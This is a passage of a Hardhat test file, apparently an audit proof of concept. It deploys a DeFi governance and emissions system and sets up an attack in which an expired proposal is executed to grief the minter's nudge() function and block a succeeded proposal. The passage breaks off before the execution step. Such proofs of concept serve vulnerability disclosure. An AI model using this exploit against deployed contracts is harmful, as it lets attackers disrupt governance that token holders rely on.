<span class="grvsc-line"><span class="grvsc-source">        await permissionsRegistry.connect(deployer).setRoleFor(deployer.address, "GOVERNANCE");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  GOVERNANCE role granted to deployer.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const TokenHandlerFactory = await ethers.getContractFactory("TokenHandler", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tokenHandler = await TokenHandlerFactory.deploy(permissionsRegistry.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await tokenHandler.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  TokenHandler deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VotingEscrowFactory = await ethers.getContractFactory("VotingEscrow", {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            signer: deployer,</span></span>
<span class="grvsc-line"><span class="grvsc-source">            libraries: { VotingBalanceLogic: votingBalanceLogic.address }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        });</span></span>
<span class="grvsc-line"><span class="grvsc-source">        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, teamEOA.address, teamEOA.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(deployer).setTeam(teamEOA.address); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  VotingEscrow deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const RewardsDistributorFactory = await ethers.getContractFactory("RewardsDistributor", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        rewardsDistributor = await RewardsDistributorFactory.deploy(votingEscrow.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await rewardsDistributor.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  RewardsDistributor deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const PairGeneratorFactory = await ethers.getContractFactory("PairGenerator", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        pairGenerator = await PairGeneratorFactory.deploy();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await pairGenerator.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const PairFactoryContract = await ethers.getContractFactory("PairFactory", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        pairFactory = await upgrades.deployProxy(PairFactoryContract, </span></span>
<span class="grvsc-line"><span class="grvsc-source">            [pairGenerator.address], </span></span>
<span class="grvsc-line"><span class="grvsc-source">            { initializer: 'initialize', kind: 'transparent', unsafeAllow: ['constructor'] }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        );</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await pairFactory.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  PairFactory (proxy) deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const AlgebraPoolAPIStorageFactory = await ethers.getContractFactory("AlgebraPoolAPIStorage", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        algebraPoolAPIStorage = await upgrades.deployProxy(AlgebraPoolAPIStorageFactory, </span></span>
<span class="grvsc-line"><span class="grvsc-source">            [ZERO_ADDRESS, permissionsRegistry.address], </span></span>
<span class="grvsc-line"><span class="grvsc-source">            {initializer: 'initialize', kind: 'transparent', unsafeAllow: ['constructor']} </span></span>
<span class="grvsc-line"><span class="grvsc-source">        );</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await algebraPoolAPIStorage.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  AlgebraPoolAPIStorage (proxy) deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const GaugeFactoryV2Contract = await ethers.getContractFactory("GaugeFactory", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        gaugeFactoryV2 = await upgrades.deployProxy(GaugeFactoryV2Contract, </span></span>
<span class="grvsc-line"><span class="grvsc-source">            [permissionsRegistry.address], </span></span>
<span class="grvsc-line"><span class="grvsc-source">            { initializer: 'initialize', kind: 'transparent', unsafeAllow: ['constructor'] }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        );</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeFactoryV2.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const GaugeFactoryCLContract = await ethers.getContractFactory("GaugeFactoryCL", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        gaugeFactoryCL = await upgrades.deployProxy(GaugeFactoryCLContract, </span></span>
<span class="grvsc-line"><span class="grvsc-source">            [permissionsRegistry.address], </span></span>
<span class="grvsc-line"><span class="grvsc-source">            { initializer: 'initialize', kind: 'transparent', unsafeAllow: ['constructor'] }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        );</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeFactoryCL.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeFactoryCL.connect(deployer).setAlgebraPoolApi(algebraPoolAPIStorage.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Gauge Factories deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const GaugeManagerContractFactory = await ethers.getContractFactory("GaugeManager", { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            signer: deployer,</span></span>
<span class="grvsc-line"><span class="grvsc-source">            libraries: { VoterFactoryLib: voterFactoryLib.address }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        });</span></span>
<span class="grvsc-line"><span class="grvsc-source">        gaugeManager = await upgrades.deployProxy(GaugeManagerContractFactory, [</span></span>
<span class="grvsc-line"><span class="grvsc-source">            votingEscrow.address, tokenHandler.address, gaugeFactoryV2.address, gaugeFactoryCL.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">            pairFactory.address, ZERO_ADDRESS, permissionsRegistry.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ], { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            initializer: 'initialize', </span></span>
<span class="grvsc-line"><span class="grvsc-source">            kind: 'transparent',         </span></span>
<span class="grvsc-line"><span class="grvsc-source">            unsafeAllow: ['constructor', 'external-library-linking'], </span></span>
<span class="grvsc-line"><span class="grvsc-source">        });</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManager.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  GaugeManager (proxy) deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const VoterV3Contract = await ethers.getContractFactory("VoterV3", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        voterV3 = await upgrades.deployProxy(VoterV3Contract, [</span></span>
<span class="grvsc-line"><span class="grvsc-source">            votingEscrow.address, tokenHandler.address, gaugeManager.address, permissionsRegistry.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ], { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            initializer: 'initialize', </span></span>
<span class="grvsc-line"><span class="grvsc-source">            kind: 'transparent', </span></span>
<span class="grvsc-line"><span class="grvsc-source">            unsafeAllow: ['constructor'] </span></span>
<span class="grvsc-line"><span class="grvsc-source">        });</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await voterV3.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  VoterV3 (proxy) deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManager.connect(deployer).setVoter(voterV3.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(teamEOA).setVoter(voterV3.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const BribeFactoryV3Contract = await ethers.getContractFactory("BribeFactoryV3", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        bribeFactoryV3 = await upgrades.deployProxy(BribeFactoryV3Contract, [</span></span>
<span class="grvsc-line"><span class="grvsc-source">            voterV3.address, gaugeManager.address, permissionsRegistry.address, tokenHandler.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ], { initializer: 'initialize', kind: 'transparent', unsafeAllow: ['constructor'] });</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await bribeFactoryV3.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManager.connect(deployer).setBribeFactory(bribeFactoryV3.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  BribeFactoryV3 (proxy) deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const MinterUpgradeableContract = await ethers.getContractFactory("MinterUpgradeable", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        minterUpgradeable = await upgrades.deployProxy(MinterUpgradeableContract, [</span></span>
<span class="grvsc-line"><span class="grvsc-source">            gaugeManager.address, votingEscrow.address, rewardsDistributor.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ], { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            initializer: 'initialize', </span></span>
<span class="grvsc-line"><span class="grvsc-source">            kind: 'transparent', </span></span>
<span class="grvsc-line"><span class="grvsc-source">            unsafeAllow: ['constructor'] </span></span>
<span class="grvsc-line"><span class="grvsc-source">        }); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minterUpgradeable.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  MinterUpgradeable (proxy) deployed.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).setMinter(minterUpgradeable.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Black token minter changed to MinterUpgradeable.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const BlackGovernorContract = await ethers.getContractFactory("BlackGovernor", deployer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        blackGovernor = await BlackGovernorContract.deploy(votingEscrow.address, minterUpgradeable.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernor.deployed();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernor.connect(deployer).setTeam(teamEOA.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Set proposalNumerator to 0 to simplify threshold debugging for now</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernor.connect(teamEOA).setProposalNumerator(0); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  BlackGovernor deployed and proposalNumerator set to 0.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minterUpgradeable.connect(deployer).setGaugeManager(gaugeManager.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minterUpgradeable.connect(deployer).setRewardDistributor(rewardsDistributor.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManager.connect(deployer).setMinter(minterUpgradeable.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await gaugeManager.connect(deployer).setBlackGovernor(blackGovernor.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await rewardsDistributor.connect(deployer).setDepositor(minterUpgradeable.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const MinterInterface = MinterUpgradeableContract.interface; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        nudgeCalldata = MinterInterface.encodeFunctionData("nudge");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Preparing proposer and voters...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const smNFTValueForProposer = ethers.utils.parseEther("2000"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const smNFTLockValueForVoters = ethers.utils.parseEther("500"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const lockDuration = CONTRACT_WEEK * 104; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).transfer(proposerEOA.address, smNFTValueForProposer); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).transfer(smVoter1EOA.address, smNFTLockValueForVoters);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(deployer).transfer(smVoter2EOA.address, smNFTLockValueForVoters);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(proposerEOA).approve(votingEscrow.address, smNFTValueForProposer);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(proposerEOA).create_lock(smNFTValueForProposer, lockDuration, true); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Proposer smNFT lock created.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(smVoter1EOA).approve(votingEscrow.address, smNFTLockValueForVoters);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(smVoter1EOA).create_lock(smNFTLockValueForVoters, lockDuration, true); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  smVoter1 smNFT created.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackToken.connect(smVoter2EOA).approve(votingEscrow.address, smNFTLockValueForVoters);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await votingEscrow.connect(smVoter2EOA).create_lock(smNFTLockValueForVoters, lockDuration, true); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  smVoter2 smNFT created.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const endOfBeforeEachTimestamp = (await ethers.provider.getBlock("latest")).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const proposerSMNFTVotesAtSetupEnd = await votingEscrow.getsmNFTPastVotes(proposerEOA.address, endOfBeforeEachTimestamp);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  End of beforeEach: Proposer smNFT Votes (current ts): ${ethers.utils.formatEther(proposerSMNFTVotesAtSetupEnd)} BLACK`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const veTotalSupplyAtSetupEnd = await votingEscrow.getPastTotalSupply(endOfBeforeEachTimestamp);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  End of beforeEach: VE TotalSupply (current ts): ${ethers.utils.formatEther(veTotalSupplyAtSetupEnd)} BLACK`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const currentThreshAtSetupEnd = await blackGovernor.proposalThreshold(); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  End of beforeEach: BlackGovernor Threshold (current ts, numerator 0): ${ethers.utils.formatEther(currentThreshAtSetupEnd)} BLACK`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Advancing Minter to Tail Emission phase...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (typeof minterUpgradeable.connect(deployer)._initialize === 'function') {</span></span>
<span class="grvsc-line"><span class="grvsc-source">             try { </span></span>
<span class="grvsc-line"><span class="grvsc-source">                 await minterUpgradeable.connect(deployer)._initialize([], [], 0); </span></span>
<span class="grvsc-line"><span class="grvsc-source">                 console.log("  MinterUpgradeable._initialize() called or already handled.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">             } catch (e) { </span></span>
<span class="grvsc-line"><span class="grvsc-source">                 console.log("  MinterUpgradeable._initialize() likely already handled by proxy or guarded: ", e.message);</span></span>
<span class="grvsc-line"><span class="grvsc-source">             }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const TAIL_START = await minterUpgradeable.TAIL_START();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let currentWeekly = await minterUpgradeable.weekly();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let loopEpochCount = 0; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const maxEpochsForSetup = 75; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  Initial Minter weekly for tail phase: ${ethers.utils.formatEther(currentWeekly)}, TAIL_START: ${ethers.utils.formatEther(TAIL_START)}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let minterEpochCountBeforeLoop = await minterUpgradeable.epochCount();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  Minter internal epochCount before loop: ${minterEpochCountBeforeLoop.toString()}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        while(currentWeekly.gte(TAIL_START) &amp;&amp; loopEpochCount &lt; maxEpochsForSetup) { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            const currentActivePeriodForMinter = await minterUpgradeable.active_period();</span></span>
<span class="grvsc-line"><span class="grvsc-source">            const currentTimeForMinter = (await ethers.provider.getBlock("latest")).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (currentTimeForMinter &lt; currentActivePeriodForMinter.add(CONTRACT_WEEK)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                const timeToAdvance = currentActivePeriodForMinter.add(CONTRACT_WEEK).sub(currentTimeForMinter).toNumber() + 60;</span></span>
<span class="grvsc-line"><span class="grvsc-source">                await advanceTime(timeToAdvance); </span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await minterUpgradeable.connect(deployer).update_period();</span></span>
<span class="grvsc-line"><span class="grvsc-source">            currentWeekly = await minterUpgradeable.weekly();</span></span>
<span class="grvsc-line"><span class="grvsc-source">            loopEpochCount++;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const finalMinterEpochCount = await minterUpgradeable.epochCount();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(currentWeekly).to.be.lt(TAIL_START, `Minter did not reach tail emission phase after ${loopEpochCount} loop iterations (Minter epoch: ${finalMinterEpochCount.toString()}). Current weekly: ${ethers.utils.formatEther(currentWeekly)}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`Minter in Tail Emission. Minter epochCount: ${finalMinterEpochCount.toString()}, Weekly: ${ethers.utils.formatEther(currentWeekly)}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("beforeEach setup complete.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    it("should allow attacker to execute an Expired proposal to grief Minter.nudge() and block a Succeeded proposal", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const targets = [minterUpgradeable.address];</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const values = [0];</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const calldatas = [nudgeCalldata]; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const descriptionExpired = "Prop EXPIRED - Nudge";</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const descriptionSucceeded = "Prop SUCCEED - Nudge";</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Proposing PROP_EXPIRED...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Get state for the block *before* the one `propose` will be in</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await advanceTime(1); // Ensure we are in a new block if previous tx was in same block</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const blockAboutToExpire = await ethers.provider.getBlock("latest");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const timestampForGetVotesExpired = blockAboutToExpire.timestamp; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const blockNumberForGetVotesExpired = blockAboutToExpire.number;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        // These calls simulate what Governor's getVotes(account, block.number-1) and proposalThreshold() will do</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Note: `getVotes` in L2Governor takes blockNumber but L2GovernorVotes._getVotes uses it as timestamp</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const proposerVotesForExpiredCheck = await blackGovernor.getVotes(proposerEOA.address, blockNumberForGetVotesExpired);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const thresholdForExpiredCheck = await blackGovernor.proposalThreshold(); // Uses current block.timestamp for its internal VE call</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  Proposer EOA: ${proposerEOA.address}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  Block number for PROP_EXPIRED getVotes snapshot: ${blockNumberForGetVotesExpired}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  Proposer's votes for PROP_EXPIRED (using block num as ts): ${ethers.utils.formatEther(proposerVotesForExpiredCheck)}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  Proposal Threshold for PROP_EXPIRED (using current ts): ${ethers.utils.formatEther(thresholdForExpiredCheck)}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        // This expect is the key debug point</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(proposerVotesForExpiredCheck).to.be.gte(thresholdForExpiredCheck, "PoC PRE-CHECK FAILED: Proposer EOA votes should be &gt;= threshold for PROP_EXPIRED");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        let txPropExpired = await blackGovernor.connect(proposerEOA).propose(targets, values, calldatas, descriptionExpired);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let receiptPropExpired = await txPropExpired.wait();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const proposalId_Expired = receiptPropExpired.events.find(e =&gt; e.event === "ProposalCreated").args.proposalId;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const actualCreationTimestampExpired = (await ethers.provider.getBlock(receiptPropExpired.blockNumber)).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const epochTimeHash_Expired = ethers.utils.hexZeroPad(ethers.utils.hexlify(calculateEpochNextJS(actualCreationTimestampExpired)), 32);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Proposing PROP_SUCCEED...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const currentEpochNextForExpired = calculateEpochNextJS(actualCreationTimestampExpired);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let timeToAdvanceForNewBTLWeek = currentEpochNextForExpired.sub(actualCreationTimestampExpired).toNumber() + 60; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (timeToAdvanceForNewBTLWeek &lt;= 60) { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            timeToAdvanceForNewBTLWeek += CONTRACT_WEEK;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await advanceTime(timeToAdvanceForNewBTLWeek); </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        await advanceTime(1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const blockForSucceededProposal = await ethers.provider.getBlock("latest");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const timestampForGetVotesSucceed = blockForSucceededProposal.timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const blockNumberForGetVotesSucceed = blockForSucceededProposal.number;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const proposerVotesForSucceedCheck = await blackGovernor.getVotes(proposerEOA.address, blockNumberForGetVotesSucceed);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const thresholdForSucceedCheck = await blackGovernor.proposalThreshold();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(proposerVotesForSucceedCheck).to.be.gte(thresholdForSucceedCheck, "PoC PRE-CHECK FAILED: Proposer EOA votes should be &gt;= threshold for PROP_SUCCEED");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        let txPropSucceed = await blackGovernor.connect(proposerEOA).propose(targets, values, calldatas, descriptionSucceeded);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let receiptPropSucceed = await txPropSucceed.wait();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const proposalId_Succeed = receiptPropSucceed.events.find(e =&gt; e.event === "ProposalCreated").args.proposalId;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const actualCreationTimestampSucceeded = (await ethers.provider.getBlock(receiptPropSucceed.blockNumber)).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const epochTimeHash_Succeed = ethers.utils.hexZeroPad(ethers.utils.hexlify(calculateEpochNextJS(actualCreationTimestampSucceeded)), 32);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(epochTimeHash_Expired).to.not.equal(epochTimeHash_Succeed, "EpochTimeHashes for proposals must be different!");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  epochTimeHash_Expired: ${epochTimeHash_Expired}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`  epochTimeHash_Succeed: ${epochTimeHash_Succeed}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Advancing time for PROP_EXPIRED to expire...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let deadlineExpired = await blackGovernor.proposalDeadline(proposalId_Expired);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let currentTime = (await ethers.provider.getBlock("latest")).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (deadlineExpired.gt(currentTime)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await advanceTime(deadlineExpired.sub(currentTime).toNumber() + 60); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(await blackGovernor.state(proposalId_Expired)).to.equal(6); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("PROP_EXPIRED is Expired.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Voting for PROP_SUCCEED...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let snapshotSucceed = await blackGovernor.proposalSnapshot(proposalId_Succeed);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        currentTime = (await ethers.provider.getBlock("latest")).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (snapshotSucceed.gt(currentTime)) { </span></span>
<span class="grvsc-line"><span class="grvsc-source">            await advanceTime(snapshotSucceed.sub(currentTime).toNumber() + 60); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernor.connect(smVoter1EOA).castVote(proposalId_Succeed, 1); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernor.connect(smVoter2EOA).castVote(proposalId_Succeed, 1); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Votes cast for PROP_SUCCEED.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        let deadlineSucceed = await blackGovernor.proposalDeadline(proposalId_Succeed);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        currentTime = (await ethers.provider.getBlock("latest")).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (deadlineSucceed.gt(currentTime)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await advanceTime(deadlineSucceed.sub(currentTime).toNumber() + 60); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(await blackGovernor.state(proposalId_Succeed)).to.equal(4); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("PROP_SUCCEED is Succeeded.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Advancing Minter to a new active period for nudge...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        let minterActivePeriodForNudge = await minterUpgradeable.active_period();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const currentBlockTimeForUpkeep = (await ethers.provider.getBlock("latest")).timestamp;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (currentBlockTimeForUpkeep &lt; minterActivePeriodForNudge.add(CONTRACT_WEEK)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            await advanceTime(minterActivePeriodForNudge.add(CONTRACT_WEEK).sub(currentBlockTimeForUpkeep).toNumber() + 60);</span></span>
